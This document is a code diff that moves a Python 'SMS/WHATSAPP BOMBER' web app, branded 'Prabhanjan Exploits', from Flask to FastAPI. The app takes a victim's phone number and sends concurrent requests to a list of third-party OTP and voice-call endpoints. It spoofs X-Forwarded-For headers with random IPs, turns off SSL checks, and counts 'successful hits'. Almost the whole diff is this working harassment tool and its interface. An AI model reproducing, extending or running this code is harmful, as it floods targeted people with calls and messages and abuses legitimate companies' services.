@@ -1,14 +1,13 @@
-from flask import Flask, request, jsonify, render_template_string
+from fastapi import FastAPI
+from fastapi.responses import HTMLResponse
 import aiohttp
 import asyncio
 import random
-import time
 
-app = Flask(__name__)
+app = FastAPI()
 
-# ============ YOUR ALL APIS HERE (ULTIMATE_APIS list paste karo) ============
+# ============ APIS LIST (Apni poori list yahan paste karo) ============
 ULTIMATE_APIS = [
-    # CALL BOMBING APIS (50+)
     {
         "name": "Tata Capital Voice Call",
         "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
@@ -4344,11 +4343,9 @@ ULTIMATE_APIS = [
     'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
     'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
 },
-
-    # 👆 Aap apni poori ULTIMATE_APIS list yahan paste kar do!
+    # 👆 YAHAN APNI POORI ULTIMATE_APIS LIST PASTE KARO
 ]
 
-# ============ HTML UI TEMPLATE ============
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -4374,26 +4371,19 @@ HTML_TEMPLATE = '''
             box-shadow: 0 25px 50px rgba(0,0,0,0.5);
         }
         .logo {
-            text-align: center;
-            font-size: 2.2em;
-            font-weight: 900;
+            text-align: center; font-size: 2.2em; font-weight: 900;
             background: linear-gradient(90deg, #ff0080, #ff8c00, #40e0d0);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
             margin-bottom: 5px;
         }
-        .subtitle {
-            text-align: center; color: #aaa; margin-bottom: 30px;
-            font-size: 0.9em; letter-spacing: 2px;
-        }
+        .subtitle { text-align: center; color: #aaa; margin-bottom: 30px; font-size: 0.9em; letter-spacing: 2px; }
         .phone-input {
             width: 100%; padding: 18px 20px;
             background: rgba(255,255,255,0.08);
             border: 2px solid transparent;
             border-radius: 15px; color: white;
             font-size: 1.2em; text-align: center;
-            outline: none; transition: all 0.3s;
-            margin-bottom: 15px;
+            outline: none; transition: all 0.3s; margin-bottom: 15px;
         }
         .phone-input:focus { border-color: #ff0080; background: rgba(255,255,255,0.12); }
         .btn-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px; }
@@ -4410,13 +4400,9 @@ HTML_TEMPLATE = '''
             font-size: 1.3em; font-weight: bold; cursor: pointer;
             transition: 0.3s; box-shadow: 0 10px 30px rgba(255,0,128,0.4);
         }
-        .bomb-btn:hover { transform: scale(1.02); box-shadow: 0 15px 40px rgba(255,0,128,0.6); }
+        .bomb-btn:hover { transform: scale(1.02); }
         .bomb-btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .stats {
-            display: none; margin-top: 25px;
-            background: rgba(0,0,0,0.3); padding: 20px;
-            border-radius: 15px;
-        }
+        .stats { display: none; margin-top: 25px; background: rgba(0,0,0,0.3); padding: 20px; border-radius: 15px; }
         .stat-row {
             display: flex; justify-content: space-between;
             color: #ccc; padding: 8px 0;
@@ -4424,8 +4410,8 @@ HTML_TEMPLATE = '''
         }
         .stat-row span:last-child { color: #40e0d0; font-weight: bold; }
         .animation { text-align: center; font-size: 3em; display: none; margin: 20px 0; }
-        @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.2); } }
-        .pulse { animation: pulse 1s infinite; }
+        @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.3); } }
+        .pulse { animation: pulse 0.8s infinite; }
         .footer { text-align: center; margin-top: 25px; color: #666; font-size: 0.8em; }
     </style>
 </head>
@@ -4434,7 +4420,7 @@ HTML_TEMPLATE = '''
         <div class="logo">💀 PRABHANJAN EXPLOITS</div>
         <div class="subtitle">⚡ ULTIMATE SMS/WHATSAPP BOMBER ⚡</div>
 
-        <input class="phone-input" id="phone" placeholder="📱 Enter Target Number" maxlength="10" type="tel" readonly>
+        <input class="phone-input" id="phone" placeholder="📱 Enter Target Number" maxlength="10" readonly>
 
         <div class="btn-grid">
             <button class="num-btn" onclick="addNum('1')">1</button>
@@ -4460,7 +4446,6 @@ HTML_TEMPLATE = '''
             <div class="stat-row"><span>Total Attacks</span><span id="total">0</span></div>
             <div class="stat-row"><span>Successful Hits</span><span id="success">0</span></div>
             <div class="stat-row"><span>Failed</span><span id="failed">0</span></div>
-            <div class="stat-row"><span>Total APIs</span><span id="apis">0</span></div>
         </div>
 
         <div class="footer">⚡ Made with 💔 by Prabhanjan Exploits ⚡</div>
@@ -4472,8 +4457,8 @@ HTML_TEMPLATE = '''
             if (p.value.length < 10) p.value += n;
         }
         function delNum() {
-            let p = document.getElementById('phone');
-            p.value = p.value.slice(0, -1);
+            document.getElementById('phone').value =
+                document.getElementById('phone').value.slice(0, -1);
         }
         function clearAll() { document.getElementById('phone').value = ''; }
 
@@ -4484,27 +4469,30 @@ HTML_TEMPLATE = '''
                 return;
             }
 
-            document.getElementById('bombBtn').disabled = true;
-            document.getElementById('bombBtn').innerHTML = '💀 BOMBING... 💀';
+            const btn = document.getElementById('bombBtn');
+            btn.disabled = true;
+            btn.innerHTML = '💀 BOMBING... 💀';
             document.getElementById('anim').style.display = 'block';
-            document.getElementById('stats').style.display = 'block';
 
             try {
                 const res = await fetch('/api/bomb?phone=' + phone);
                 const data = await res.json();
 
-                document.getElementById('total').innerText = data.total;
-                document.getElementById('success').innerText = data.success;
-                document.getElementById('failed').innerText = data.failed;
-                document.getElementById('apis').innerText = data.apis;
+                document.getElementById('stats').style.display = 'block';
+                document.getElementById('total').innerHTML =
+                    (parseInt(document.getElementById('total').innerText) || 0) + data.total;
+                document.getElementById('success').innerHTML =
+                    (parseInt(document.getElementById('success').innerText) || 0) + data.success;
+                document.getElementById('failed').innerHTML =
+                    (parseInt(document.getElementById('failed').innerText) || 0) + data.failed;
 
                 document.getElementById('anim').style.display = 'none';
-                document.getElementById('bombBtn').innerHTML = '✅ DONE! BOMB AGAIN? ✅';
-                document.getElementById('bombBtn').disabled = false;
+                btn.innerHTML = '✅ DONE! BOMB AGAIN? ✅';
+                btn.disabled = false;
             } catch(e) {
-                alert('Error: ' + e.message);
-                document.getElementById('bombBtn').innerHTML = '🚀 START BOMBING 🚀';
-                document.getElementById('bombBtn').disabled = false;
+                alert('❌ Error: ' + e.message);
+                btn.innerHTML = '🚀 START BOMBING 🚀';
+                btn.disabled = false;
                 document.getElementById('anim').style.display = 'none';
             }
         }
@@ -4513,32 +4501,27 @@ HTML_TEMPLATE = '''
 </html>
 '''
 
-# ============ ROUTES ============
-@app.route('/')
-def home():
-    return render_template_string(HTML_TEMPLATE)
+@app.get("/", response_class=HTMLResponse)
+async def home():
+    return HTML_TEMPLATE
 
-@app.route('/api/bomb')
-def bomb():
-    phone = request.args.get('phone', '')
+@app.get("/bomb")
+async def bomb(phone: str):
     if not phone.isdigit() or len(phone) != 10:
-        return jsonify({"error": "Invalid number"}), 400
-    
-    result = asyncio.run(run_bomb(phone))
-    return jsonify(result)
+        return {"error": "Invalid number"}
+
+    result = await run_bomb(phone)
+    return result
 
 async def hit_api(session, api, phone):
     try:
         url = api["url"](phone) if callable(api["url"]) else api["url"]
-        headers = {k: v for k, v in api["headers"].items() if k.lower() != "content-type"}
-        if "headers" in api:
-            headers.update(api["headers"])
-        
+        headers = dict(api["headers"])
         headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
         headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
 
         timeout = aiohttp.ClientTimeout(total=8)
-        
+
         if api["method"] == "POST":
             data = api["data"](phone) if api["data"] else None
             async with session.post(url, headers=headers, data=data, timeout=timeout, ssl=False) as response:
@@ -4550,18 +4533,18 @@ async def hit_api(session, api, phone):
         return 0
 
 async def run_bomb(phone):
-    stats = {"total": 0, "success": 0, "failed": 0, "apis": len(ULTIMATE_APIS)}
-    
+    stats = {"total": 0, "success": 0, "failed": 0}
+
     connector = aiohttp.TCPConnector(limit=0, verify_ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
         tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
         results = await asyncio.gather(*tasks, return_exceptions=True)
-    
+
     for r in results:
         stats["total"] += 1
         if r == 1:
             stats["success"] += 1
         else:
             stats["failed"] += 1
-    
+
     return stats
